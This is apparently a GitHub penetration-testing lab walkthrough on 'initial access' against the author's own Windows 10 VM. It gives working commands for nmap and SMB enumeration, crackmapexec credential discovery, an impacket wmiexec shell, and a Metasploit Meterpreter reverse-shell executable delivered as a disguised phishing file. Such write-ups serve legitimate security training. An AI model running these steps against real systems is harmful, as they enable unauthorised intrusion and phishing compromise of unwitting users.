<h1 align="center"> INITIAL ACCESS (Shell) </h1>

<img width="1024" height="700" alt="Intial Access" src="https://github.com/user-attachments/assets/ce302363-a03e-4778-abe8-5386ed9ace82" />




# Introduction To Initial Access

## What is Initial Access?
Initial access is the very first step in a cyberattack or penetration test where you gain your first foothold inside a target system or network.



# Initial Access Methodology

## On Target 
- On target first we need to close virus protection for test -> Press `Ctrl + S`:
<img width="1918" height="941" alt="image" src="https://github.com/user-attachments/assets/b06fea07-b6f9-4a0c-8872-b405b7a41328" />

<img width="882" height="895" alt="image" src="https://github.com/user-attachments/assets/2ea853e0-446c-46e6-9de3-564a426e6572" />

Close all of these to `On`:
<img width="942" height="875" alt="image" src="https://github.com/user-attachments/assets/9db3e391-4af5-438a-977c-a0ba9afe7745" />

<img width="452" height="316" alt="image" src="https://github.com/user-attachments/assets/55071ae1-adac-4178-bac2-0f04d2e7dbfc" />

<img width="891" height="896" alt="image" src="https://github.com/user-attachments/assets/c014c7a7-f385-4ec7-b381-c0c3a8a54d1e" />


- After close Firewall -> press `Ctrl + S`:
<img width="861" height="930" alt="image" src="https://github.com/user-attachments/assets/070070fe-1fec-470e-882a-f50d6a89a003" />

<img width="1120" height="587" alt="image" src="https://github.com/user-attachments/assets/f7641b01-953c-49bc-b294-4e3c3c97606e" />

<img width="957" height="642" alt="image" src="https://github.com/user-attachments/assets/5be69e88-3f96-41e7-b2fe-22332f7e6478" />

<img width="842" height="457" alt="image" src="https://github.com/user-attachments/assets/04685654-9b4d-44a8-acf3-a0fcfeb3d353" />

<img width="1918" height="890" alt="image" src="https://github.com/user-attachments/assets/8d8eac63-9140-4d26-9938-58a8a3077dd3" />

<img width="812" height="521" alt="image" src="https://github.com/user-attachments/assets/c6f39a0f-6a5b-43ed-87b4-67aaa6a8ee3f" />


---




## On Attacker:

### Reconnaissance & Enumeration

#### Find target:
````
nmap 192.168.127.0/24 -sV -T4
````
<img width="1387" height="715" alt="image" src="https://github.com/user-attachments/assets/c3e3ff6a-e019-4b1e-b942-162dac1f3e97" />

Now we found our target IP: 192.168.127.142 


#### Port scanning the target
````
nmap --script vuln 192.168.127.142
````
<img width="992" height="373" alt="image" src="https://github.com/user-attachments/assets/0a14a555-e5a4-481b-a8a6-fb862e3b1b4c" />




#### Scan for SMB vuln
````
nmap --script smb-vuln* -p445 192.168.127.142
````
<img width="946" height="322" alt="image" src="https://github.com/user-attachments/assets/3981083b-e963-4d70-b319-e0c6b891d808" />



### RUN ALL SMB SCRIPTS
````
nmap -p445 --script "smb-* and not brute" 192.168.127.142
````
<img width="1209" height="555" alt="image" src="https://github.com/user-attachments/assets/934787f6-019b-418f-9abf-6dc3c77acf11" />


### ENUMERATE WITH ENUM4LINUX/SMBMAP
#### Using enum4linux
````
enum4linux -a 192.168.127.142
````
<img width="922" height="536" alt="image" src="https://github.com/user-attachments/assets/7c9d8160-2b9c-4803-a531-ca51a05d94cf" />


#### Crackmapexec
````
Crackmapexec smb 192.168.127.142 --users
````
<img width="1915" height="145" alt="image" src="https://github.com/user-attachments/assets/447dce33-c22a-4838-8dec-2a38e931936a" />

````
crackmapexec smb 192.168.127.142 -u k4n0ng -U 'k4n0ng'
````
<img width="1763" height="97" alt="image" src="https://github.com/user-attachments/assets/a416a391-2676-4419-b685-f29bfca8b251" />

Now we found the target `Usernmae` and `Password` of SMB.


### Get shell:
````
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py k4n0ng:k4n0ng@192.168.127.142
````
<img width="989" height="138" alt="image" src="https://github.com/user-attachments/assets/cd23c342-424d-4408-a122-30c68b782300" />

In this my Windows 10 is local admin, so i can't access to SMB port if others windows maybe can.




## Phishing malicious

### We can use with `msfconsole` or generate on terminal:

#### Start Metasploit
````
msfconsole
````

#### Generate a Windows payload within Metasploit
````
use payload/windows/meterpreter/reverse_tcp
generate -f exe -o /tmp/invoice.exe
````
- LHOST and LPORT will be set when you use it.


### Use on Terminal:
First I need to check my kali IP:
````
ifconfig
````
<img width="825" height="407" alt="image" src="https://github.com/user-attachments/assets/f4687ff3-1075-439e-a5e8-c1e272b73df6" />

So my IP is `192.168.127.128`.

````
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f exe -o win_priv.exe
````
<img width="1080" height="182" alt="image" src="https://github.com/user-attachments/assets/34ab84ae-95c3-44b8-9979-ba1e8a54a7b4" />

Now we got successful to get payload.

#### Setup Listener 
````
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.127.128
set LPORT 4444
set ExitOnSession false
exploit -j
````
<img width="1571" height="425" alt="image" src="https://github.com/user-attachments/assets/3e406599-78ff-4047-ad76-f106b44998a5" />

Now we was create listener but no session, so i need to send to taregt.

#### Send to target:
````
ls
ls -la win_priv.exe
````
<img width="1911" height="227" alt="image" src="https://github.com/user-attachments/assets/ac8efc55-4496-4dad-bbbd-7c2ee95a426d" />

Also in this I use with python server:
````
python3 -m http.server 8000
````
<img width="502" height="136" alt="image" src="https://github.com/user-attachments/assets/3abf430b-5c72-4aa4-89ec-2468f9b5a4b4" />


#### On target:
On target -> Go to `browser (FireFox)` -> type my target IP:
````
192.168.127.12:8000
````
<img width="1919" height="876" alt="image" src="https://github.com/user-attachments/assets/99fdf884-06e8-4d17-992b-13b1b3e5e5bf" />

<img width="637" height="842" alt="image" src="https://github.com/user-attachments/assets/96ecbb71-96d3-4f5a-9b1e-cea64b7151b1" />

Now we see the target `payload`. After click `Download` it, but in this we can't download it:
<img width="1276" height="807" alt="image" src="https://github.com/user-attachments/assets/c27cad73-8805-4e37-96b2-8ad9e66ffeef" />

Now we can download it -> go to `File`:
<img width="1122" height="596" alt="image" src="https://github.com/user-attachments/assets/d143b8d7-1f34-4ffc-b7ee-3dd97560d2fa" />

Now we see the `Payload` file -> `Double-Click` on it -> click on `More info`:
<img width="533" height="500" alt="image" src="https://github.com/user-attachments/assets/255b1660-97c7-48ea-8656-e48b072e8fc8" />

<img width="531" height="497" alt="image" src="https://github.com/user-attachments/assets/5efade86-5d0c-4829-9ae8-e98778759840" />

After back to attacker.

#### On attacker:
<img width="1599" height="472" alt="image" src="https://github.com/user-attachments/assets/b19d637e-42a6-404b-ae7e-997bb3699dab" />

Press `Enter`:

````
sessions
````
<img width="1458" height="178" alt="image" src="https://github.com/user-attachments/assets/8766bf7b-ae06-4e13-9da4-4c30ded5370f" />

Now we see the target.

````
sessions 1
````
<img width="979" height="801" alt="image" src="https://github.com/user-attachments/assets/d58b5132-ac0c-4933-b388-b0013e7accb1" />

Now we hot target `meterpreter`.


---

<h2 align="center"> Finished of Initial Access (Shell) </h2>

<h2 align="center"> Credit By: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 24/12/2025 </h3>
